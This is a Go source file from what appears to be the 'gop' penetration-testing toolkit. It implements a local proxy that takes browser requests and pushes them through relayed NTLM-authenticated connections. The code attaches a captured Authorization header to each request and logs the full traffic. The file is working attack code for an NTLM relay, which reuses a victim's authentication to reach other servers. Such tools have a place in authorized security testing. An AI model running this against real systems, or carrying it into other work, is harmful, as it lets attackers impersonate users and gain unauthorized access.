package gopRelay

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httputil"
	"strings"

	gopproxy "github.com/hophouse/gop/gopProxy"
	"github.com/hophouse/gop/utils"
	"github.com/hophouse/gop/utils/logger"
)

func RunLocalProxy() {
	addr := fmt.Sprintf("%s:%s", "127.0.0.1", "4444")
	_, err := net.ResolveTCPAddr("tcp4", addr)
	utils.CheckErrorExit(err)

	l, err := net.Listen("tcp4", addr)
	utils.CheckErrorExit(err)
	defer l.Close()

	for {
		conn, err := l.Accept()
		if err != nil {
			logger.Println(err)
			break
		}
		handleConnection(conn)
	}
}

// proxyConn receive a client connection
// clientProxyConn send request as the proxy
func handleConnection(proxyConn net.Conn) {
	defer proxyConn.Close()

	logger.Printf("Receive conenction from %s to %s\n", proxyConn.RemoteAddr(), proxyConn.LocalAddr())
	reader := bufio.NewReader(proxyConn)

	req, err := http.ReadRequest(reader)
	if ok := utils.CheckError(err); ok {
		return
	}
	defer req.Body.Close()

	var currentConnection *NTLMAuthHTTPRelay = nil
	var currentRelay *Relay = nil

	DisplayConnexions(connexions)

	// Check if the connexion is available in the relays
	for _, client := range connexions {
		fmt.Printf("[+] Testing %s %s\n", client.ClientConnUUID, client.RemoteIP)
		for _, relay := range client.Relays {
			fmt.Printf("\t- %s %s\n", relay.relayUUID, relay.target)
			fmt.Printf("\t\t- %s\n", req.URL.String())
			if strings.Contains(relay.target, req.URL.Hostname()) {
				_, err = proxyConn.Write([]byte("HTTP/1.1 200 OK\r\nProxy-agent: GoPentest/1.0\r\n\r\n"))
				if err != nil {
					logger.Println(err)
					return
				}
				currentRelay = relay
				currentConnection = client
			}
		}
	}

	if currentConnection == nil || currentRelay == nil {
		logger.Printf("No connection matches %s\n", req.URL.String())
		return
	}

	// Connect method
	if req.Method == "CONNECT" {

		clientProxyConn := currentConnection.clientConn

		// Proxy receive HTTP request from the client
		proxyReader := bufio.NewReader(proxyConn)
		req, err := http.ReadRequest(proxyReader)
		if ok := utils.CheckError(err); ok {
			return
		}

		// Add the "Authorization" header in order to be authentified
		req.Header.Add("Authorization", currentRelay.AuthorizationHeader)

		// Proxy dumps client request and write it to the clientProxy connection.
		// It does the what the client would have done wihtout the proxy
		dumpedReq, _ := httputil.DumpRequest(req, true)
		_, err = clientProxyConn.Write(dumpedReq)
		if err != nil {
			logger.Println(err)
			return
		}
		for _, line := range strings.Split(string(dumpedReq), "\n") {
			logger.Fprintf(logger.Writer(), "%s | %s | %s -> %s : %s\n", currentConnection.ClientConnUUID, currentRelay.relayUUID, "gop", req.Host, line)
		}
		logger.Fprint(logger.Writer(), "\n")

		// Retrieve response from the remote server
		clientProxyReader := bufio.NewReader(clientProxyConn)
		res, err := http.ReadResponse(clientProxyReader, req)
		if ok := utils.CheckError(err); ok {
			return
		}
		defer res.Body.Close()

		// Dump response from the server
		// Write the reponnse to the server
		dumpedRes, _ := httputil.DumpResponse(res, true)
		_, err = proxyConn.Write(dumpedRes)
		if err != nil {
			logger.Println(err)
			return
		}
		for _, line := range strings.Split(string(dumpedRes), "\n") {
			logger.Fprintf(logger.Writer(), "%s | %s | %s <- %s : %s\n", currentConnection.ClientConnUUID, currentRelay.relayUUID, "gop", req.Host, line)
		}
		logger.Fprint(logger.Writer(), "\n")

		proxyConn.Close()
		clientProxyConn.Close()

		return
	}

	dumpedReq, err := httputil.DumpRequest(req, true)
	if err != nil {
		logger.Println(err)
		return
	}

	for _, line := range strings.Split(string(dumpedReq), "\n") {
		logger.Fprintf(logger.Writer(), "%s -> %s : %s\n", "client", "gop", line)
	}
	logger.Fprint(logger.Writer(), "\n")

	newRequest, err := http.NewRequest(req.Method, req.URL.String(), nil)
	if ok := utils.CheckError(err); ok {
		return
	}

	gopproxy.CopyHeader(newRequest.Header, req.Header)
	// Add the "Authorization" header in order to be authentified
	newRequest.Header.Add("Authorization", currentRelay.AuthorizationHeader)

	dumpedReq, err = httputil.DumpRequest(newRequest, true)
	if err != nil {
		logger.Println(err)
		return
	}

	for _, line := range strings.Split(string(dumpedReq), "\n") {
		logger.Fprintf(logger.Writer(), "%s -> %s : %s\n", "gop", "target", line)
	}

	logger.Fprint(logger.Writer(), "\n")

	client := http.Client{}
	resp, err := client.Do(newRequest)
	if ok := utils.CheckError(err); ok {
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		logger.Println(err)
		return
	}

	dumpedResp, err := httputil.DumpResponse(resp, false)
	if err != nil {
		logger.Println(err)
		return
	}

	for _, line := range strings.Split(string(dumpedResp), "\n") {
		logger.Fprintf(logger.Writer(), "%s <- %s : %s\n", "gop", "target", line)
	}
	for _, line := range strings.Split(string(body), "\n") {
		logger.Fprintf(logger.Writer(), "%s <- %s : %s\n", "gop", "target", line)
	}
	logger.Fprint(logger.Writer(), "\n")

	_, err = proxyConn.Write(body)
	if utils.CheckError(err) {
		return
	}
}
